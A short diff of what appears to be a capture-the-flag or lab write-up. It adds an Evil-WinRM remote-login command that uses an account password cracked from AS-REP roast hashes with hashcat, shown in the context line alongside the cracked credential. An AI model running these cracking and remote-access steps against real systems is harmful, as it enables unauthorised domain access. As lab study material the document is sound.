@@ -43,6 +43,13 @@ hashcat -m 18200 -a 0 asreprost.hashes /usr/share/seclists/Passwords/Leaked-Data
 ```
 - svc-alfresco:_s3rvice_
 
+##### Evil-winrm
+```bash
+evil-winrm -i $IP -u svc-alfresco -p s3rvice
+```
+
+##### BloodHound
+
 
 
 
